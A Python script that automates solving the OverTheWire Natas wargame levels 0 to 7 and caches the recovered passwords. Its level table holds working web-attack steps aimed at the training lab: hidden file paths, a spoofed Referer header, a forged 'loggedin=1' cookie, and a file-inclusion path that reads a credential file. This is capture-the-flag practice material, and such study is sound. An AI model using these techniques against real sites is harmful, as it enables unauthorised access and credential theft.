import os
import re
import requests

PASSWORD_FILE = "natas_passwords"
MAX_LEVEL = 8


# INIT PASSWORD FILE
if not os.path.exists(PASSWORD_FILE):
    with open(PASSWORD_FILE, "w") as f:
        f.write("0:natas0\n")


# CACHE HELPERS
def get_password(level):
    if not os.path.exists(PASSWORD_FILE):
        return None

    with open(PASSWORD_FILE, "r") as f:
        for line in f:
            if line.startswith(f"{level}:"):
                return line.strip().split(":", 1)[1]
    return None


def save_password(level, password):
    lines = []

    if os.path.exists(PASSWORD_FILE):
        with open(PASSWORD_FILE, "r") as f:
            lines = f.readlines()

    lines = [l for l in lines if not l.startswith(f"{level}:")]
    lines.append(f"{level}:{password}\n")

    with open(PASSWORD_FILE, "w") as f:
        f.writelines(lines)


def remove_password(level):
    if not os.path.exists(PASSWORD_FILE):
        return

    with open(PASSWORD_FILE, "r") as f:
        lines = f.readlines()

    with open(PASSWORD_FILE, "w") as f:
        for line in lines:
            if not line.startswith(f"{level}:"):
                f.write(line)



# CORE REQUEST HELPERS
def request(level, password, path="/", headers=None, data=None, method="GET"):
    if headers is None:
        headers = {}
    if data is None:
        data = {}
    
    url = f"http://natas{level}.natas.labs.overthewire.org{path}"
    
    if method=="POST":
        return requests.post(url, auth=(f"natas{level}", password), headers=headers, data=data)
    else:
        return requests.get(url, auth=(f"natas{level}", password), headers=headers, data=data)

# LEVEL SOLVERS
def solve_level_A(level, pw):
    config = LEVELS[level]
    
    path = config["path"]
    headers = config.get("headers", {})
    method = config.get("method")
    data = config.get("data", {})
    
    r = request(level, pw, path, headers, data, method)
    match = re.findall(r"[A-Za-z0-9]{32}", r.text)
    return match[-1] if match else None

def solve_level_B(level,pw):
    config = LEVELS[level]

    path = config["path"]
    headers = config.get("headers", {})
    method = config.get("method")
    data_foo = config.get("data_foo")
    data = data_foo(pw) if data_foo else {}

    r = request(level, pw, path, headers, data, method)
    match = re.findall(r"[A-Za-z0-9]{32}", r.text)
    return match[-1] if match else None

# LEVEL AUXILIARY FUNCTIONS

def get_level_6_data(password):
    url = "http://natas6.natas.labs.overthewire.org/includes/secret.inc"
    r = requests.get(url, auth=("natas6", password))
    
    match = re.search(r'"([^"]+)"', r.text)
    secret = match.group(1)
    return {
        "secret": secret,
        "submit": "Submit Query"
    }
    
# LEVEL SPECIFIC DATA

LEVELS = {
    0: {
        "solver": solve_level_A,
        "path": "/"
    },
    1: {
        "solver": solve_level_A,
        "path": "/"
    },
    2: {
        "solver": solve_level_A,
        "path": "/files/users.txt"
    },
    3: {
        "solver": solve_level_A,
        "path": "/s3cr3t/users.txt"
    },
    4: {
        "solver": solve_level_A,
        "path": "/",
        "headers": {
            "Referer": "http://natas5.natas.labs.overthewire.org/"
        }
    },
    5: {
        "solver": solve_level_A,
        "path": "/",
        "headers": {
            "Cookie": "loggedin=1"
        }
    },
    6: {
        "solver": solve_level_B,
        "path": "/",
        "method": "POST",
        "data_foo": get_level_6_data
    },
    7: {
        "solver": solve_level_A,
        "path": "/index.php?page=/etc/natas_webpass/natas8"
    }
}

# CACHE VALIDATION
def test_password(level, pw, path):
    try:
        r = request(level, pw, path)
        return r.status_code == 200
    except:
        return False


# MAIN LOOP
def main(target_level=1):
    password = "natas0"
    resume = target_level-1

    # resume from cache
    for i in range(target_level - 1, 0, -1):
        print(f"Testing cache for level {i}")
        cached = get_password(i)
        path = LEVELS[i]["path"]
        if cached and test_password(i, cached, path):
            password = cached
            print(f"Found valid password for level {i}")
            break
        else:
            remove_password(i)
            resume -= 1

    # main solve loop
    for i in range(resume, target_level, +1):
        next_level = i + 1
        solver = LEVELS[i]["solver"]
        
        print(f"Level {i} -> {next_level}")
        password = solver(i, password)

        save_password(next_level, password)
        print(f"Password for level {next_level}: {password}")


if __name__ == "__main__":
    import sys
    
    target_level = int(sys.argv[1]) if len(sys.argv) > 1 else MAX_LEVEL
    if target_level < 1:
        raise ValueError("target_level must be >= 1")
    if target_level > MAX_LEVEL:
        print(f"[!] Clamping target_level to MAX_LEVEL ({MAX_LEVEL})")
        target_level = MAX_LEVEL
        
    main(target_level)